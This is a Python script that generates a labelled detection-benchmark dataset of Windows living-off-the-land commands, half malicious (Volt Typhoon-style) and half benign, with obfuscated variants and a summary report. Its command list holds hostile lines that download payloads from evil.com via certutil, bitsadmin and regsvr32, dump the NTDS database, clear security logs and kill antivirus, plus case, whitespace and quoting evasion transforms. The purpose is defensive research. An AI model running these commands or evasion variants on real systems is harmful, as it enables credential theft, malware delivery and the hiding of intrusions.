#!/usr/bin/env python3
"""
Advanced LOTL Dataset Generator with Alternative Syntax
Creates 100 realistic commands (50 LOTL + 50 benign) with variations based on:
- Volt Typhoon APT techniques
- Alternative syntax patterns
- State-sponsored actor command obfuscation
"""

import pandas as pd
import numpy as np
import random
from pathlib import Path

class AlternativeSyntaxGenerator:
    """Generates realistic alternative syntax variations for Windows commands"""
    
    def __init__(self):
        # Volt Typhoon signature LOTL techniques
        self.volt_typhoon_commands = [
            'ntdsutil snapshot "activate instance ntds" create quit quit',
            'wmic process call create "cmd.exe /c ntdsutil.exe"',
            'netsh interface portproxy add v4tov4 listenaddress=0.0.0.0',
            'powershell -EncodedCommand <base64_payload>',
            'certutil -urlcache -split -f http://evil.com/payload.exe',
            'bitsadmin /transfer job http://evil.com/file.exe C:\\temp\\file.exe',
            'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'schtasks /create /tn "UpdateTask" /tr "cmd.exe /c malware.exe"',
            'wbemtest.exe',
            'rundll32.exe shell32.dll,Control_RunDLL desk.cpl',
            'forfiles /p C:\\windows\\system32 /m notepad.exe /c calc.exe',
            'mshta javascript:alert(document.cookie)',
            'regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll',
            'cscript //nologo //e:jscript C:\\temp\\payload.js',
            'wmic process get commandline',
            'net user administrator /active:yes',
            'vssadmin create shadow /for=C:',
            'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
            'wevtutil cl security',
            'taskkill /f /im antivirus.exe',
            'whoami /priv',
            'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"',
            'ipconfig /all | findstr DNS',
            'arp -a',
            'netstat -ano | findstr LISTENING'
        ]
        
        # Benign administrative commands
        self.benign_commands = [
            'dir C:\\Windows\\System32',
            'systeminfo',
            'ipconfig /all',
            'ping google.com',
            'nslookup microsoft.com',
            'tracert 8.8.8.8',
            'netstat -an',
            'tasklist /svc',
            'services.msc',
            'eventvwr.msc',
            'msconfig',
            'regedit',
            'cmd /c echo %PATH%',
            'powershell Get-Process',
            'wmic bios get serialnumber',
            'diskpart list disk',
            'chkdsk C: /f',
            'sfc /scannow',
            'dism /online /cleanup-image /restorehealth',
            'gpupdate /force',
            'net user',
            'net group',
            'net share',
            'net time',
            'net statistics'
        ]
        
        # Alternative syntax patterns used by APT groups
        self.syntax_variations = {
            'command_shortening': [
                ('activate instance', 'ac i'),
                ('create', 'cr'),
                ('delete', 'del'),
                ('administrator', 'admin'),
                ('process', 'proc'),
                ('service', 'svc'),
                ('computer', 'comp'),
                ('system', 'sys'),
                ('network', 'net'),
                ('information', 'info')
            ],
            'quote_variations': [
                'single_quotes',
                'double_quotes',
                'mixed_quotes',
                'escaped_quotes'
            ],
            'path_obfuscation': [
                'short_names',
                'environment_vars',
                'relative_paths',
                'unc_paths'
            ],
            'parameter_variations': [
                'slash_params',
                'dash_params',
                'mixed_params'
            ]
        }

    def generate_alternative_syntax(self, command, is_malicious=True):
        """Generate alternative syntax variations for a command"""
        variations = []
        
        # Original command
        variations.append(command)
        
        # 1. Command shortening (APT technique)
        shortened = command
        for full, short in self.syntax_variations['command_shortening']:
            shortened = shortened.replace(full, short)
        if shortened != command:
            variations.append(shortened)
        
        # 2. Quote variations
        if '"' in command:
            # Mixed quotes
            mixed_quote = command.replace('"', "'")
            variations.append(mixed_quote)
            
            # Escaped quotes
            escaped = command.replace('"', '\\"')
            variations.append(f'"{escaped}"')
        
        # 3. Path obfuscation
        if 'C:\\Windows' in command:
            # Environment variable
            env_var = command.replace('C:\\Windows', '%WINDIR%')
            variations.append(env_var)
            
            # Short name
            short_path = command.replace('C:\\Windows\\System32', 'C:\\WINDOWS\\SYSTEM~1')
            variations.append(short_path)
        
        # 4. Parameter variations
        if '/' in command:
            # Convert to dash params
            dash_params = command.replace('/', '-')
            variations.append(dash_params)
        
        # 5. Case variations
        if is_malicious:
            # Malicious commands often use mixed case to evade detection
            case_mixed = ''.join(c.upper() if i % 2 == 0 else c.lower() 
                               for i, c in enumerate(command))
            variations.append(case_mixed)
        
        # 6. Whitespace variations
        if ' ' in command:
            # Multiple spaces (common in obfuscated commands)
            multi_space = command.replace(' ', '  ')
            variations.append(multi_space)
            
            # Tab characters
            tab_space = command.replace(' ', '\t')
            variations.append(tab_space)
        
        # Return unique variations (limit to 3-5 per command)
        unique_variations = list(set(variations))
        return unique_variations[:5]

    def create_realistic_lotl_commands(self):
        """Create 50 realistic LOTL commands with variations"""
        lotl_commands = []
        
        # Select base commands and create variations
        selected_commands = random.sample(self.volt_typhoon_commands, 15)
        
        for base_cmd in selected_commands:
            variations = self.generate_alternative_syntax(base_cmd, is_malicious=True)
            
            for var in variations:
                if len(lotl_commands) >= 50:
                    break
                    
                # Add realistic context and parameters
                enhanced_cmd = self.enhance_command(var, is_malicious=True)
                
                lotl_commands.append({
                    'command': enhanced_cmd,
                    'label': 'malicious',
                    'technique': self.identify_mitre_technique(enhanced_cmd),
                    'source': 'volt_typhoon_variant',
                    'obfuscation_type': self.identify_obfuscation(var, base_cmd),
                    'privilege_level': self.determine_privilege_level(enhanced_cmd)
                })
                
                if len(lotl_commands) >= 50:
                    break
        
        return lotl_commands[:50]

    def create_realistic_benign_commands(self):
        """Create 50 realistic benign commands with variations"""
        benign_commands = []
        
        # Select base commands and create variations
        selected_commands = random.sample(self.benign_commands, 15)
        
        for base_cmd in selected_commands:
            variations = self.generate_alternative_syntax(base_cmd, is_malicious=False)
            
            for var in variations:
                if len(benign_commands) >= 50:
                    break
                    
                # Add realistic administrative context
                enhanced_cmd = self.enhance_command(var, is_malicious=False)
                
                benign_commands.append({
                    'command': enhanced_cmd,
                    'label': 'benign',
                    'technique': 'administrative',
                    'source': 'admin_variant',
                    'obfuscation_type': self.identify_obfuscation(var, base_cmd),
                    'privilege_level': self.determine_privilege_level(enhanced_cmd)
                })
                
                if len(benign_commands) >= 50:
                    break
        
        return benign_commands[:50]

    def enhance_command(self, command, is_malicious=True):
        """Add realistic parameters and context to commands"""
        if is_malicious:
            # Add suspicious elements typical of APT groups
            enhancements = [
                f'cmd.exe /c "{command}"',
                f'powershell.exe -windowstyle hidden -exec bypass -c "{command}"',
                f'wmic.exe process call create "{command}"',
                f'schtasks /create /tn "SystemUpdate" /tr "{command}" /sc onlogon',
                command  # Keep some original
            ]
        else:
            # Add legitimate administrative context
            enhancements = [
                command,
                f'cmd.exe /c {command}',
                f'powershell.exe -c "{command}"',
                f'{command} > C:\\temp\\output.txt',
                f'echo Checking system... & {command}'
            ]
        
        return random.choice(enhancements)

    def identify_mitre_technique(self, command):
        """Identify MITRE ATT&CK technique based on command"""
        cmd_lower = command.lower()
        
        techniques = {
            'ntdsutil': 'T1003.003',  # NTDS
            'wmic': 'T1047',          # Windows Management Instrumentation
            'netsh': 'T1562.004',     # Disable or Modify System Firewall
            'certutil': 'T1105',      # Ingress Tool Transfer
            'bitsadmin': 'T1197',     # BITS Jobs
            'regsvr32': 'T1218.010',  # Regsvr32
            'mshta': 'T1218.005',     # Mshta
            'schtasks': 'T1053.005',  # Scheduled Task
            'vssadmin': 'T1490',      # Inhibit System Recovery
            'bcdedit': 'T1490',       # Inhibit System Recovery
            'wevtutil': 'T1070.001',  # Clear Windows Event Logs
        }
        
        for tool, technique in techniques.items():
            if tool in cmd_lower:
                return technique
        
        return 'T1059.001'  # PowerShell (default)

    def identify_obfuscation(self, varied_command, original_command):
        """Identify the type of obfuscation used"""
        if varied_command == original_command:
            return 'none'
        
        obfuscation_types = []
        
        if len(varied_command) < len(original_command):
            obfuscation_types.append('shortened')
        
        if varied_command.count(' ') != original_command.count(' '):
            obfuscation_types.append('whitespace')
        
        if varied_command.count('"') != original_command.count('"'):
            obfuscation_types.append('quotes')
        
        if '%' in varied_command and '%' not in original_command:
            obfuscation_types.append('environment_vars')
        
        if any(c.isupper() != d.isupper() for c, d in zip(varied_command, original_command)):
            obfuscation_types.append('case_variation')
        
        return ','.join(obfuscation_types) if obfuscation_types else 'syntax_variation'

    def determine_privilege_level(self, command):
        """Determine required privilege level"""
        cmd_lower = command.lower()
        
        high_priv_indicators = [
            'ntdsutil', 'vssadmin', 'bcdedit', 'wevtutil', 'schtasks',
            '/create', 'administrator', 'system', 'reg add', 'net user'
        ]
        
        medium_priv_indicators = [
            'wmic', 'netsh', 'regsvr32', 'certutil', 'bitsadmin'
        ]
        
        if any(indicator in cmd_lower for indicator in high_priv_indicators):
            return 'high'
        elif any(indicator in cmd_lower for indicator in medium_priv_indicators):
            return 'medium'
        else:
            return 'user'

def main():
    """Generate the advanced LOTL dataset"""
    print("🚀 Generating Advanced LOTL Dataset with Alternative Syntax")
    print("=" * 70)
    
    generator = AlternativeSyntaxGenerator()
    
    # Generate LOTL commands
    print("🔴 Generating 50 LOTL commands with Volt Typhoon techniques...")
    lotl_commands = generator.create_realistic_lotl_commands()
    print(f"   ✅ Generated {len(lotl_commands)} LOTL commands")
    
    # Generate benign commands
    print("🟢 Generating 50 benign commands with administrative variations...")
    benign_commands = generator.create_realistic_benign_commands()
    print(f"   ✅ Generated {len(benign_commands)} benign commands")
    
    # Combine datasets
    all_commands = lotl_commands + benign_commands
    
    # Create DataFrame
    df = pd.DataFrame(all_commands)
    
    # Add additional metadata
    df['command_id'] = range(1, len(df) + 1)
    df['dataset_version'] = '2.0_alternative_syntax'
    df['creation_date'] = '2025-11-24'
    
    # Shuffle the dataset
    df = df.sample(frac=1, random_state=42).reset_index(drop=True)
    
    # Save dataset
    output_file = "advanced_lotl_alternative_syntax_dataset.csv"
    df.to_csv(output_file, index=False)
    
    print(f"\n📊 Dataset Statistics:")
    print(f"   Total commands: {len(df)}")
    print(f"   Malicious: {len(df[df['label'] == 'malicious'])}")
    print(f"   Benign: {len(df[df['label'] == 'benign'])}")
    print(f"   Unique techniques: {df['technique'].nunique()}")
    print(f"   Privilege levels: {df['privilege_level'].value_counts().to_dict()}")
    
    print(f"\n🎯 Sample Commands:")
    for i, row in df.head(5).iterrows():
        label_emoji = "🔴" if row['label'] == 'malicious' else "🟢"
        print(f"   {label_emoji} [{row['label'].upper()}] {row['command'][:80]}...")
        print(f"      Technique: {row['technique']} | Obfuscation: {row['obfuscation_type']}")
    
    print(f"\n💾 Dataset saved to: {output_file}")
    print(f"📋 Ready for advanced LOTL benchmarking!")
    
    # Create summary report
    create_dataset_report(df, output_file)

def create_dataset_report(df, filename):
    """Create a detailed report of the dataset"""
    report_lines = [
        "# Advanced LOTL Dataset Report - Alternative Syntax",
        f"**Generated:** 2025-11-24",
        f"**Filename:** {filename}",
        f"**Total Commands:** {len(df)}",
        "",
        "## Dataset Composition",
        f"- **Malicious Commands:** {len(df[df['label'] == 'malicious'])} (50%)",
        f"- **Benign Commands:** {len(df[df['label'] == 'benign'])} (50%)",
        "",
        "## MITRE ATT&CK Techniques Covered",
    ]
    
    # Add technique breakdown
    technique_counts = df[df['label'] == 'malicious']['technique'].value_counts()
    for technique, count in technique_counts.items():
        report_lines.append(f"- **{technique}:** {count} commands")
    
    report_lines.extend([
        "",
        "## Obfuscation Techniques",
    ])
    
    # Add obfuscation breakdown
    obfuscation_counts = df['obfuscation_type'].value_counts()
    for obfuscation, count in obfuscation_counts.items():
        report_lines.append(f"- **{obfuscation}:** {count} commands")
    
    report_lines.extend([
        "",
        "## Key Features",
        "- **Alternative Syntax Variations:** Commands shortened using APT techniques",
        "- **Realistic Context:** Based on actual Volt Typhoon campaign patterns",
        "- **Quote Obfuscation:** Mixed single/double quotes and escaping",
        "- **Path Obfuscation:** Environment variables and short names",
        "- **Case Variations:** Mixed case to evade detection",
        "- **Whitespace Variations:** Multiple spaces and tab characters",
        "",
        "## Example Alternative Syntax Patterns",
        "```",
        'Original: ntdsutil snapshot "activate instance ntds" create quit quit',
        'Shortened: ntdsutil snapshot "ac i ntds" create quit quit',
        'Quote Mixed: ntdsutil snapshot \'ac i ntds\' create quit quit',
        'Environment: %WINDIR%\\System32\\ntdsutil.exe snapshot "ac i ntds"',
        "```",
        "",
        "## Research Applications",
        "- **LLM Security Evaluation:** Test model robustness against syntax variations",
        "- **Detection System Testing:** Validate signature-based detection limits",
        "- **Obfuscation Research:** Study APT command line obfuscation techniques",
        "- **Benchmark Development:** Create comprehensive security benchmarks"
    ])
    
    # Save report
    report_file = filename.replace('.csv', '_report.md')
    with open(report_file, 'w') as f:
        f.write('\n'.join(report_lines))
    
    print(f"📄 Dataset report saved to: {report_file}")

if __name__ == "__main__":
    main()